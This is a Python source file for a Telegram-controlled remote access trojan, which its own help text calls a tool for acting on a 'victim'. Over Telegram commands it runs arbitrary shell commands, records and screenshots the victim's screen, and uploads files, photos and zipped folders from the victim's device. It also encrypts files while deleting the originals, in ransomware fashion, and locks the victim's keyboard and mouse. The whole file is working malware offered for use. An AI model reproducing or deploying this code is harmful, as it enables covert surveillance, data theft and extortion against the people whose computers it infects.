import telebot 
import subprocess
import pyscreenrec 
import os  
import tempfile
import time 
import webbrowser
import urllib.parse
import pyautogui
from pynput import mouse as pmouse
import shutil
import keyboard
import platform
import ctypes
from cryptography.fernet import Fernet
token = "your_token_here"
bot = telebot.TeleBot(token)
@bot.message_handler(commands = ['alamut'])
def welcome (message):
    bot.send_message(message.chat.id,'alamot is here')

@bot.message_handler(commands=['help'])
def help(message):
    bot.send_message(message.chat.id,'use /sys to get sys info\n\nuse /encrypt D:\myfile.txt to encrypt file or folder\n\nuse /decrypt D:\myfile.txt.enc YOURKEY to decrypt the file or folder\n\nuse /ip to get the ip of the victim\n\nuse /run [the command you want to use] to run any command\n\nuse /record 10 (time in sec) to record the victim screen\n\nuse /search [the website you want] to search the social media of the victim and get a screenshot of it\n\nuse /screen to take a screenshot of the victim screen\n\nuse /lock to lock the victim mouse and keyboard\n\nuse /unlock to unlock the victim keyboard and mouse\n\nuse /get [file_path] to get the file you want from the victim device\n\nuse /photo [photo_path] to get the photo you want from the victim device\n\nuse /folder [folder_path] to get the folder you want as zip file from the victim device\n\nuse /close to close the session')

@bot.message_handler(commands=['sys'])
def sysinfo(message):
    os_name = platform.system()
    os_version = platform.version()
    username = os.getlogin()
    try:
        is_admin = ctypes.windll.user32.GetShellWindow() != 0 and ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = os.getuid() == 0  
    privilege = "admin" if is_admin else "user"
    bot.reply_to(message, f"""
OS: {os_name} {os_version}
User: {username}
Privilege: {privilege}
""")

@bot.message_handler(commands=['encrypt'])
def encrypt_file(message):
    try: 
     input_data = message.text.split(maxsplit=1)
     enc_path = input_data[1]
     key = Fernet.generate_key()
     f = Fernet(key)

     if os.path.isfile(enc_path):
        with open(enc_path, 'rb') as file:
            encrypted = f.encrypt(file.read())
        with open(enc_path + ".enc", 'wb') as file:
            file.write(encrypted)
        os.remove(enc_path)
        bot.reply_to(message, f" Encrypted: {enc_path}.enc\n Key: `{key.decode()}`")
     elif os.path.isdir(enc_path):
        count = 0
        for root, dirs, files in os.walk(enc_path):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                with open(file_path, 'rb') as file:
                    encrypted = f.encrypt(file.read())
                with open(file_path + ".enc", 'wb') as file:
                    file.write(encrypted)
                os.remove(file_path)
                count += 1
        bot.reply_to(message, f"Encrypted {count} files in {enc_path}\n Key: `{key.decode()}`")
    except Exception as e:
        bot.send_message(message.chat.id, f"Failed to encrypt the file/folder: {str(e)}")

@bot.message_handler(commands=['decrypt'])
def decrypt_file(message):
   try:
    parts = message.text.split(' ', 2)
    path = parts[1].strip()
    key = parts[2].strip().encode()

    f = Fernet(key)

    if os.path.isfile(path):
        with open(path, 'rb') as file:
            decrypted = f.decrypt(file.read())
        out_path = path.replace(".enc", "")
        with open(out_path, 'wb') as file:
            file.write(decrypted)
        os.remove(path)
        bot.reply_to(message, f"Decrypted: {out_path}")
    elif os.path.isdir(path):
        count = 0
        for root, dirs, files in os.walk(path):
            for file_name in files:
                if file_name.endswith(".enc"):
                    file_path = os.path.join(root, file_name)
                    with open(file_path, 'rb') as file:
                        decrypted = f.decrypt(file.read())
                    out_path = file_path.replace(".enc", "")
                    with open(out_path, 'wb') as file:
                        file.write(decrypted)
                    os.remove(file_path)
                    count += 1
        bot.reply_to(message, f" Decrypted {count} files in {path}")
   except Exception as e:
        bot.send_message(message.chat.id, f"Failed to decrypt the file/folder: {str(e)}")

@bot.message_handler(commands = ['ip'])
def ip (message):
    c_ip= "curl ipinfo.io/ip"
    result = subprocess.run(c_ip,shell= True,capture_output=True , text=True)
    ip = result.stdout.strip()
    bot.send_message(message.chat.id,ip)

@bot.message_handler(commands = ['run'])
def run(message):
    input_data = message.text.split(maxsplit=1)

    if len(input_data) < 2 :
        bot.reply_to(message,"enter a valid command for example: run curl ipinfo.io/ip")
        return
    user_command = input_data[1]
    bot.send_message(message.chat.id,f"excuting: {user_command}")
    try:
        result =subprocess.run(user_command, shell=True , capture_output=True , text= True , timeout= 20 )
        output = result.stdout if result.stdout else result.stderr
        if not (output):
            output = ("command executed but there is no ouput")
        bot.send_message(message.chat.id,output,parse_mode="Markdown")
    except Exception as e :
        bot.send_message(message.chat.id,f"execution failed{str(e)}") 


@bot.message_handler(commands = ['record'])
def record (message):
    input_data = message.text.split()
    if len(input_data) < 2 :
        bot.reply_to(message,"enter a valid command for example: /record 30 (time in sec)")
        return
    record_d = int(input_data[1])
    bot.send_message(message.chat.id,f"recording for {record_d}s")

    temp_dir = tempfile.gettempdir()
    temp_filename = os.path.join(temp_dir, "rec.mp4")
    try:
        recorder = pyscreenrec.ScreenRecorder()
        
        
        recorder.start_recording(temp_filename, fps=30)
        time.sleep(record_d)
        
        recorder.stop_recording()
        with open(temp_filename,'rb') as vid :
            bot.send_video(message.chat.id,vid,caption=f'{record_d}s screen capture',timeout=180)
    finally:
        time.sleep(1)
        if os.path.exists(temp_filename):
            try:
             os.remove(temp_filename)
            except:
                pass

@bot.message_handler(commands = ['search'] )
def search (message):
    input_data = message.text.split(maxsplit=1)
    if len(input_data) < 2 :
        bot.reply_to(message,"enter a valid command for example: /search facebook.com")
        return
    search_q = input_data[1]
    encoded_search = urllib.parse.quote_plus(search_q)
    search_url = f"https://www.google.com/search?q={encoded_search}"
    temp_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
    
    try:
        
        webbrowser.open(search_url)
        bot.send_message(message.chat.id, f'searching {search_url} on host machine', parse_mode='Markdown')
        time.sleep(2)
        screenshot = pyautogui.screenshot()
        screenshot.save(temp_path)
        with open(temp_path, 'rb') as ph:
            bot.send_photo(message.chat.id, ph, caption="Current Screen View")
    
    except Exception as e:
        bot.send_message(message.chat.id, f"Failed to open browser: {str(e)}")
    finally:
        time.sleep(1)
        if os.path.exists(temp_path):
            try:
             os.remove(temp_path)
            except:
                pass

@bot.message_handler(commands = ['screen'])
def screen (message):
    temp_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
    try:

        screenshot = pyautogui.screenshot()
        screenshot.save(temp_path)
        with open(temp_path, 'rb') as ph:
            bot.send_photo(message.chat.id, ph)
    except Exception as e:
        bot.send_message(message.chat.id, f"Failed to take screenshot: {str(e)}")
    finally:
        time.sleep(1)
        if os.path.exists(temp_path):
            try:
             os.remove(temp_path)
            except:
                pass

@bot.message_handler(commands = ['lock'])
def lock (message):
    global hook,mouse_listener
    hook = keyboard.hook(lambda e: False, suppress=True)
    mouse_listener = pmouse.Listener(suppress=True)
    mouse_listener.start()
    bot.reply_to(message,"locked")

@bot.message_handler(commands = ['unlock'])
def unlock (message):
    global hook,mouse_listener
    keyboard.unhook(hook)
    mouse_listener.stop()
    bot.reply_to(message,"unlocked")

@bot.message_handler(commands=['get'])
def get_file (message):
    try:
     
     input_data = message.text.split(maxsplit=1)
     file_path = input_data[1]
     with open(file_path, 'rb') as f:
        bot.send_document(message.chat.id, f)
    except Exception as e:
        bot.send_message(message.chat.id, f"Failed to get the file: {str(e)}")

@bot.message_handler(commands=['photo'])
def send_photo(message):
    try:
     input_data = message.text.split(maxsplit=1)
     photo_path = input_data[1]
     with open(photo_path, 'rb') as f:
        bot.send_photo(message.chat.id, f)
    except Exception as e:
        bot.send_message(message.chat.id, f"Failed to get the photo: {str(e)}")

@bot.message_handler(commands=['folder'])
def send_folder(message):
    try:
     input_data = message.text.split(maxsplit=1)
     folder_path = input_data[1]
     folder = folder_path
     zip_path = folder_path+".zip"
     shutil.make_archive(folder_path, 'zip', folder)
     with open(zip_path, 'rb') as f:
        bot.send_document(message.chat.id, f)
     os.remove(zip_path)
    except Exception as e:
        bot.send_message(message.chat.id, f"Failed to get the folder: {str(e)}")

@bot.message_handler(commands = ['close'])
def close(message):
    bot.reply_to(message,"closing sesssion")
    bot.stop_polling()
    exit()

bot.infinity_polling()